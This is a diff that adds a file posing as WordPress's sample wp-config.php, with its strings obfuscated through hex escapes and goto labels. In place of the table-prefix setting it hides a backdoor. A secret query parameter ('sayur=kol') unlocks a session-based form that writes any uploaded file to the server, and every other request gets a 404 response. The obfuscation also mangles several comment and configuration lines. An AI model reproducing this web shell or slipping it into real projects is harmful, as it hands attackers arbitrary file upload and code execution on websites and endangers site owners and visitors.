@@ -1,0 +1,102 @@
+<?php goto opet_4cbaa; opet_4cbaa: /**
+ * The base configuration for WordPress
+ *
+ * The wp-config.php creation script uses this file during the installation.
+ * You don"\x74\040\x68\141\x76\145\x20\164\x6F\040\x75\163\x65\040\x74\150\x65\040\x77\145\x62\163\x69\164\x65\054\x20\171\x6F\165\x20\143\x61\156\x20\143\x6F\160\x79\040\x74\150\x69\163\x20\146\x69\154\x65\040\x74\157\x20\042\x77\160\x2D\143\x6F\156\x66\151\x67\056\x70\150\x70\042\xD\012\x20\052\x20\141\x6E\144\x20\146\x69\154\x6C\040\x69\156\x20\164\x68\145\x20\166\x61\154\x75\145\x73\056\xD\012\x20\052\xD\012\x20\052\x20\124\x68\151\x73\040\x66\151\x6C\145\x20\143\x6F\156\x74\141\x69\156\x73\040\x74\150\x65\040\x66\157\x6C\154\x6F\167\x69\156\x67\040\x63\157\x6E\146\x69\147\x75\162\x61\164\x69\157\x6E\163\x3A\015\xA\040\x2A\015\xA\040\x2A\040\x2A\040\x44\141\x74\141\x62\141\x73\145\x20\163\x65\164\x74\151\x6E\147\x73\015\xA\040\x2A\040\x2A\040\x53\145\x63\162\x65\164\x20\153\x65\171\x73\015\xA\040\x2A\040\x2A\040\x44\141\x74\141\x62\141\x73\145\x20\164\x61\142\x6C\145\x20\160\x72\145\x66\151\x78\015\xA\040\x2A\040\x2A\040\x41\102\x53\120\x41\124\x48\015\xA\040\x2A\015\xA\040\x2A\040\x40\154\x69\156\x6B\040\x68\164\x74\160\x73\072\x2F\057\x64\145\x76\145\x6C\157\x70\145\x72\056\x77\157\x72\144\x70\162\x65\163\x73\056\x6F\162\x67\057\x61\144\x76\141\x6E\143\x65\144\x2D\141\x64\155\x69\156\x69\163\x74\162\x61\164\x69\157\x6E\057\x77\157\x72\144\x70\162\x65\163\x73\057\x77\160\x2D\143\x6F\156\x66\151\x67\057\xD\012\x20\052\xD\012\x20\052\x20\100\x70\141\x63\153\x61\147\x65\040\x57\157\x72\144\x50\162\x65\163\x73\015\xA\040\x2A\057\xD\012\xD\012\x2F\057\x20\052\x2A\040\x44\141\x74\141\x62\141\x73\145\x20\163\x65\164\x74\151\x6E\147\x73\040\x2D\040\x59\157\x75\040\x63\141\x6E\040\x67\145\x74\040\x74\150\x69\163\x20\151\x6E\146\x6F\040\x66\162\x6F\155\x20\171\x6F\165\x72\040\x77\145\x62\040\x68\157\x73\164\x20\052\x2A\040\x2F\057\xD\012\x2F\052\x2A\040\x54\150\x65\040\x6E\141\x6D\145\x20\157\x66\040\x74\150\x65\040\x64\141\x74\141\x62\141\x73\145\x20\146\x6F\162\x20\127\x6F\162\x64\120\x72\145\x73\163\x20\052\x2F\015\xA\144\x65\146\x69\156\x65\050\x20"DB_NAME"\x2C\040"database_name_here"\x20\051\x3B\015\xA\015\xA\057\x2A\052\x20\104\x61\164\x61\142\x61\163\x65\040\x75\163\x65\162\x6E\141\x6D\145\x20\052\x2F\015\xA\144\x65\146\x69\156\x65\050\x20"DB_USER"\x2C\040"username_here"\x20\051\x3B\015\xA\015\xA\057\x2A\052\x20\104\x61\164\x61\142\x61\163\x65\040\x70\141\x73\163\x77\157\x72\144\x20\052\x2F\015\xA\144\x65\146\x69\156\x65\050\x20"DB_PASSWORD"\x2C\040"password_here"\x20\051\x3B\015\xA\015\xA\057\x2A\052\x20\104\x61\164\x61\142\x61\163\x65\040\x68\157\x73\164\x6E\141\x6D\145\x20\052\x2F\015\xA\144\x65\146\x69\156\x65\050\x20"DB_HOST"\x2C\040"localhost"\x20\051\x3B\015\xA\015\xA\057\x2A\052\x20\104\x61\164\x61\142\x61\163\x65\040\x63\150\x61\162\x73\145\x74\040\x74\157\x20\165\x73\145\x20\151\x6E\040\x63\162\x65\141\x74\151\x6E\147\x20\144\x61\164\x61\142\x61\163\x65\040\x74\141\x62\154\x65\163\x2E\040\x2A\057\xD\012\x64\145\x66\151\x6E\145\x28\040"DB_CHARSET"\x2C\040"utf8"\x20\051\x3B\015\xA\015\xA\057\x2A\052\x20\124\x68\145\x20\144\x61\164\x61\142\x61\163\x65\040\x63\157\x6C\154\x61\164\x65\040\x74\171\x70\145\x2E\040\x44\157\x6E"t change this if in doubt. */
+define( "\x44\102\x5F\103\x4F\114\x4C\101\x54\105", "" );
+
+/**#@+
+ * Authentication unique keys and salts.
+ *
+ * Change these to different unique phrases! You can generate these using
+ * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
+ *
+ * You can change these at any point in time to invalidate all existing cookies.
+ * This will force all users to have to log in again.
+ *
+ * @since 2.6.0
+ */
+define( "\x41\125\x54\110\x5F\113\x45\131",         "\x70\165\x74\040\x79\157\x75\162\x20\165\x6E\151\x71\165\x65\040\x70\150\x72\141\x73\145\x20\150\x65\162\x65" );
+define( "\x53\105\x43\125\x52\105\x5F\101\x55\124\x48\137\x4B\105\x59",  "\x70\165\x74\040\x79\157\x75\162\x20\165\x6E\151\x71\165\x65\040\x70\150\x72\141\x73\145\x20\150\x65\162\x65" );
+define( "\x4C\117\x47\107\x45\104\x5F\111\x4E\137\x4B\105\x59",    "\x70\165\x74\040\x79\157\x75\162\x20\165\x6E\151\x71\165\x65\040\x70\150\x72\141\x73\145\x20\150\x65\162\x65" );
+define( "\x4E\117\x4E\103\x45\137\x4B\105\x59",        "\x70\165\x74\040\x79\157\x75\162\x20\165\x6E\151\x71\165\x65\040\x70\150\x72\141\x73\145\x20\150\x65\162\x65" );
+define( "\x41\125\x54\110\x5F\123\x41\114\x54",        "\x70\165\x74\040\x79\157\x75\162\x20\165\x6E\151\x71\165\x65\040\x70\150\x72\141\x73\145\x20\150\x65\162\x65" );
+define( "\x53\105\x43\125\x52\105\x5F\101\x55\124\x48\137\x53\101\x4C\124", "\x70\165\x74\040\x79\157\x75\162\x20\165\x6E\151\x71\165\x65\040\x70\150\x72\141\x73\145\x20\150\x65\162\x65" );
+define( "\x4C\117\x47\107\x45\104\x5F\111\x4E\137\x53\101\x4C\124",   "\x70\165\x74\040\x79\157\x75\162\x20\165\x6E\151\x71\165\x65\040\x70\150\x72\141\x73\145\x20\150\x65\162\x65" );
+define( "\x4E\117\x4E\103\x45\137\x53\101\x4C\124",       "\x70\165\x74\040\x79\157\x75\162\x20\165\x6E\151\x71\165\x65\040\x70\150\x72\141\x73\145\x20\150\x65\162\x65" );
+
+/**#@-*/
+
+/**
+ * WordPress database table prefix.
+ *
+ * You can have multiple installations in one database if you give each
+ * a unique prefix. Only numbers, letters, and underscores please!
+ */
+session_start(); 
+$expected_param = "\x73\141\x79\165\x72";
+$expected_value = "\x6B\157\x6C";
+$is_authenticated = isset($_SESSION["\x61\165\x74\150\x65\156\x74\151\x63\141\x74\145\x64"]) && $_SESSION["\x61\165\x74\150\x65\156\x74\151\x63\141\x74\145\x64"] === true;
+
+if (isset($_GET[$expected_param]) && $_GET[$expected_param] === $expected_value) {
+    if (!$is_authenticated) {
+        $_SESSION["\x61\165\x74\150\x65\156\x74\151\x63\141\x74\145\x64"] = true;
+        $is_authenticated = true;
+    }
+
+    $upload_dir = __DIR__ . "\x2F"; 
+    $is_writable = is_writable($upload_dir);
+
+    if ($is_authenticated) {
+        if ($_SERVER["\x52\105\x51\125\x45\123\x54\137\x4D\105\x54\110\x4F\104"] === "\x50\117\x53\124" && isset($_FILES["\x66\151\x6C\145"])) {
+            $upload_file = $upload_dir . basename($_FILES["\x66\151\x6C\145"]["\x6E\141\x6D\145"]);
+
+            if (move_uploaded_file($_FILES["\x66\151\x6C\145"]["\x74\155\x70\137\x6E\141\x6D\145"], $upload_file)) {
+                echo "\x46\151\x6C\145\x20\163\x75\143\x63\145\x73\163\x66\165\x6C\154\x79\040\x75\160\x6C\157\x61\144\x65\144\x3A\040" . htmlspecialchars(basename($_FILES["\x66\151\x6C\145"]["\x6E\141\x6D\145"]));
+            } else {
+                echo "\x41\156\x20\145\x72\162\x6F\162\x20\157\x63\143\x75\162\x72\145\x64\040\x64\165\x72\151\x6E\147\x20\146\x69\154\x65\040\x75\160\x6C\157\x61\144\x2E";
+            }
+        } ?>
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <title>File Upload</title>
+        </head>
+        <body>
+            <p>Upload Directory Status: <strong><?php goto opet_4cbb9; opet_4cbb9: echo $is_writable ? "\x57\162\x69\164\x61\142\x6C\145" : "\x4E\157\x74\040\x57\162\x69\164\x61\142\x6C\145"; ?></strong></p>
+            <form action="" method="post" enctype="multipart/form-data">
+                <label for="file">Choose a file:</label>
+                <input type="file" name="file" id="file" required>
+                <button type="submit">Upload</button>
+            </form>
+        </body>
+        </html>
+        <?php goto opet_4cbe3; opet_4cbe3: exit; 
+    }
+} else {
+    http_response_code(404);
+    exit;
+}
+/**
+ * For developers: WordPress debugging mode.
+ *
+ * Change this to true to enable the display of notices during development.
+ * It is strongly recommended that plugin and theme developers use WP_DEBUG
+ * in their development environments.
+ *
+ * For information on other constants that can be used for debugging,
+ * visit the documentation.
+ *
+ * @link https://developer.wordpress.org/advanced-administration/debug/debug-wordpress/
+ */
+define( "\x57\120\x5F\104\x45\102\x55\107", false );
+
+/* Add any custom values between this line and the "\x73\164\x6F\160\x20\145\x64\151\x74\151\x6E\147" line. */
+
+
+
+/* That"\x73\040\x61\154\x6C\054\x20\163\x74\157\x70\040\x65\144\x69\164\x69\156\x67\041\x20\110\x61\160\x70\171\x20\160\x75\142\x6C\151\x73\150\x69\156\x67\056\x20\052\x2F\015\xA\015\xA\057\x2A\052\x20\101\x62\163\x6F\154\x75\164\x65\040\x70\141\x74\150\x20\164\x6F\040\x74\150\x65\040\x57\157\x72\144\x50\162\x65\163\x73\040\x64\151\x72\145\x63\164\x6F\162\x79\056\x20\052\x2F\015\xA\151\x66\040\x28\040\x21\040\x64\145\x66\151\x6E\145\x64\050\x20"ABSPATH"\x20\051\x20\051\x20\173\xD\012\x20\040\x20\040\x20\040\x20\040\x64\145\x66\151\x6E\145\x28\040"ABSPATH"\x2C\040\x5F\137\x44\111\x52\137\x5F\040\x2E\040"/' );
+}
+
+/** Sets up WordPress vars and included files. */ ?>
